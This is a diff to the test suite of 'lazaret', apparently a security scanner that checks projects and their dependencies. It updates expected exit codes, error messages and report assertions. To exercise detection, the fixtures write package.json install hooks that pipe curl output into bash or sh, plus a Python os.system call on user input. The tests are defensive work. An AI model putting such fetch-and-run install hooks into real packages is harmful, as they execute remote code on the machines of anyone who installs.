@@ -11,10 +11,10 @@ function capture(argv, opts = {}) {
   return { code, out: out.join("\n"), err: err.join("\n") };
 }
 
-test("default with no command prints the tagline and usage hint, exit 1", () => {
+test("default with no directory prints the tagline and usage hint, exit 2", () => {
   const r = capture([]);
-  assert.equal(r.code, 1);          // no command given → usage error
-  assert.match(r.err, /no command given/);
+  assert.equal(r.code, 2);          // no directory given → usage error (exit 2, as documented)
+  assert.match(r.err, /no directory given/);
   assert.match(r.err, /quarantine for your dependencies/);
 });
 
@@ -31,15 +31,16 @@ test("--help exits 0 and shows usage", () => {
   assert.match(r.out, /check <directory>/);
 });
 
-test("unknown command fails with 1", () => {
-  assert.equal(capture(["bogus"]).code, 1);
-  assert.match(capture(["bogus"]).err, /unknown command: bogus/);
+test("a bare non-directory argument is a usage error (exit 2)", () => {
+  // `lazaret <dir>` is the Python-style invocation, so "bogus" is a target
+  assert.equal(capture(["bogus-no-such-dir"]).code, 2);
+  assert.match(capture(["bogus-no-such-dir"]).err, /does not exist/);
 });
 
 test("check on missing directory exits 2 with error", () => {
   const r = capture(["check", join(tmpdir(), "lazaret-no-such-dir-xyz")]);
   assert.equal(r.code, 2);
-  assert.match(r.err, /is not a directory/);
+  assert.match(r.err, /does not exist/);
 });
 
 test("check on clean project: exit 0, gate PASSED, JSON+HTML written", () => {
@@ -61,14 +62,17 @@ test("check on clean project: exit 0, gate PASSED, JSON+HTML written", () => {
   }
 });
 
-test("check on vulnerable project: exit 1, report records findings", () => {
+test("check on vulnerable project: exit 0 without --ci, report records findings", () => {
   const d = mkdtempSync(join(tmpdir(), "lazaret-vuln-"));
   try {
     writeFileSync(join(d, "app.py"), "import os\nos.system(user_cmd)\n");
     writeFileSync(join(d, "package.json"),
       JSON.stringify({ name: "evil", scripts: { postinstall: "curl http://x.sh | bash" } }));
     const r = capture(["check", d, "--no-html", "--quiet"]);
-    assert.equal(r.code, 1);      // CRITICAL SC- finding → 48033f94 exit parity
+    // spec 10: only SC-MANIFEST-DEPTH forces a non-zero exit without --ci
+    // (this test used to expect exit 1 for any CRITICAL SC- finding)
+    assert.equal(r.code, 0);
+    assert.match(r.out, /Quality gate: FAILED/);
     const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
     assert.equal(rep.pass, false);
     assert.ok(rep.issues.some((i) => i.rule === "S-OSCMD-PY"));
@@ -178,14 +182,16 @@ test("--include-deps scans node_modules content (dep rules only)", () => {
   }
 });
 
-test("oversize file (>2MB) yields SC-TRUNCATED CRITICAL, exit 1, honest metrics", () => {
+test("oversize file (>2MB) yields SC-TRUNCATED CRITICAL, gate fails, honest metrics", () => {
   const d = mkdtempSync(join(tmpdir(), "lazaret-big-"));
   try {
     writeFileSync(join(d, "big.py"), "x = 1\n" + "#".repeat(2_100_000) + "\n");
     writeFileSync(join(d, "small.py"), "y = 2\n");
     const r = capture(["check", d, "--no-html", "--quiet"]);
-    assert.equal(r.code, 1);
+    assert.equal(r.code, 0);             // spec 10: exit 1 only with --ci (was: forced exit 1)
+    assert.equal(capture(["check", d, "--no-html", "--quiet", "--ci", "--force-overwrite"]).code, 1);
     const rep = JSON.parse(readFileSync(join(d, "lazaret-report.json"), "utf8"));
+    assert.equal(rep.pass, false);
     const t = rep.issues.find((i) => i.rule === "SC-TRUNCATED");
     assert.ok(t, "SC-TRUNCATED present");
     assert.equal(t.sev, "CRITICAL");
@@ -197,9 +203,11 @@ test("oversize file (>2MB) yields SC-TRUNCATED CRITICAL, exit 1, honest metrics"
 });
 
 
-// Dependency manifests are always scanned (quarantine stance): a hostile
-// install hook in node_modules fails the scan even without --include-deps.
-test("hostile dependency install hook fails the scan", () => {
+// Dependency trees are pruned without --deps (spec 8): an install hook in
+// node_modules is reported as a skipped tree, not a failed gate; with --deps
+// the hook is found and --ci fails. (This test used to expect exit 1 without
+// --include-deps — any dependency install hook failed every project scan.)
+test("dependency install hooks are checked with --deps, pruned (and reported) without", () => {
   const dir = mkdtempSync(join(tmpdir(), "lz-dep-"));
   try {
     const dep = join(dir, "node_modules", "evil-pkg");
@@ -207,7 +215,12 @@ test("hostile dependency install hook fails the scan", () => {
     writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "evil-pkg", scripts: {
       postinstall: "curl -s http://192.0.2.1/x | sh" } }, null, 2));
     writeFileSync(join(dir, "app.js"), "export const x = 1;\n");
-    const r = capture(["check", dir, "--no-json", "--no-html", "--quiet"]);
-    assert.equal(r.code, 1);
+    const r = capture(["check", dir, "--no-html", "--quiet"]);
+    assert.equal(r.code, 0);
+    const rep = JSON.parse(readFileSync(join(dir, "lazaret-report.json"), "utf8"));
+    assert.ok(rep.issues.some((i) => i.rule === "Q-SKIPPED-TREE" && i.file === "node_modules"));
+    assert.ok(!rep.issues.some((i) => i.rule === "SC-INSTALL-HOOK"));
+    const withDeps = capture(["check", dir, "--no-json", "--no-html", "--quiet", "--deps", "--ci"]);
+    assert.equal(withDeps.code, 1);
   } finally { rmSync(dir, { recursive: true, force: true }); }
 });
